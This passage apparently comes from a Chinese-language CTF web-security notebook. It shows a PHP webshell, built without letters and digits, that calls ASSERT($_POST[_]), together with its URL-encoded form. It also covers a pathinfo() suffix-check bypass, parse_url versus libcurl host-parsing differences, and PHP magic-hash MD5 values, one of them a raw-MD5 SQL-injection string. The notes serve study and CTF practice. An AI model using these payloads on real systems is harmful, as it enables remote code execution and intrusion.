class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b_%<span class="number">5</span>d(%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b__%<span class="number">5</span>d)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>!%<span class="number">27</span>%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">40</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>___%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>____%<span class="number">3</span>d%<span class="number">27</span>_%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>b%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>b_%<span class="number">5</span>d)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>
<p>第二个payload需要PHP小于7的版本，因为在PHP7，assert不再可以被动态调用</p>
<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>参考：<br>利用&#x2F;tmp&#x2F;phpxxxxxx</p>
<h2 id="8-pathinfo-函数漏洞"><a href="#8-pathinfo-函数漏洞" class="headerlink" title="8.pathinfo()函数漏洞"></a>8.pathinfo()函数漏洞</h2><p>参考如下：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668136976498-c6f59b58-b1d9-44b5-b793-557e1d82688f.png#averageHue=%23fbfaf9&clientId=u6b10d232-7d8c-4&from=paste&height=470&id=ub8579ce9&name=image.png&originHeight=587&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60396&status=done&style=none&taskId=u21fda4f6-d78a-40dd-bb17-18e4f202ccb&title=&width=892.8" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$pathinfo_name</span>=<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pathinfo_name</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们传入1.php&#x2F;.后，后缀名为NULL，这样可以绕过一些检测：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668137027251-3fc7d9b4-05f9-4d12-a39b-4a92ecd783e0.png#averageHue=%23fdfcfc&clientId=u6b10d232-7d8c-4&from=paste&height=230&id=u69f02579&name=image.png&originHeight=287&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56817&status=done&style=none&taskId=ufc0c2093-2590-4c45-a79a-6ae19f4ff62&title=&width=405.6" alt="image.png"><br>$pathinfo[extension]&#x3D;pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。如<code>/../../../../1.php</code>，还是会检测出php</p>
<h2 id="9-LInux提权"><a href="#9-LInux提权" class="headerlink" title="9.LInux提权"></a>9.LInux提权</h2><p>这边儿还是自己实操为好，之前因为一道错题，全测了个遍，正好也练了会儿</p>
<p><strong>SUID利用</strong></p>
<h2 id="10-SSTI大全"><a href="#10-SSTI大全" class="headerlink" title="10.SSTI大全"></a>10.SSTI大全</h2><h2 id="11-parse-url解析问题"><a href="#11-parse-url解析问题" class="headerlink" title="11.parse_url解析问题"></a>11.parse_url解析问题</h2><p>参考：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">完整url: scheme:[<span class="comment">//[user[:password]@]host[:port]][/path][?query][#fragment]</span></span><br><span class="line">这里仅讨论url中不含<span class="string">&#x27;?&#x27;</span>的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//u:p@a.com:80@b.com/</span></span><br><span class="line"></span><br><span class="line">php解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: b.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:<span class="number">80</span></span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: a.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: <span class="number">80</span></span><br><span class="line">    后面的@b.com/会被忽略掉</span><br></pre></td></tr></table></figure>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><hr>
<p><strong>Md5</strong></p>
<table>
<thead>
<tr>
<th>0e1137126905</th>
<th>0e291659922323405260514745084877</th>
<th>php magic hash</th>
</tr>
</thead>
<tbody><tr>
<td>0e215962017</td>
<td>0e291242476940776845150308577824</td>
<td>php magic hash</td>
</tr>
<tr>
<td>240610708</td>
<td>0e462097431906509019562988736854</td>
<td>php magic hash</td>
</tr>
<tr>
<td>QNKCDZO</td>
<td>0e830400451993494058024219903391</td>
<td>php magic hash</td>
</tr>
<tr>
<td>129581926211651571912466741651878684928</td>
<td>06da5430449f8f6f23dfc1276f722738</td>
<td>raw : ?T0D??o#??’or’8</td>
</tr>
<tr>
<td>.N&#x3D;?</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<p><strong>编码</strong></p>
<hr>
<p><strong>一些转换网址</strong></p>
<hr>
<p><strong>一些教程网址</strong></p>
<p> <a target="_blank" rel="noopener" href="https://www.ddosi.org/shell">https://www.ddosi.org/shell</a>  </p>
<p>原型链污染：</p>
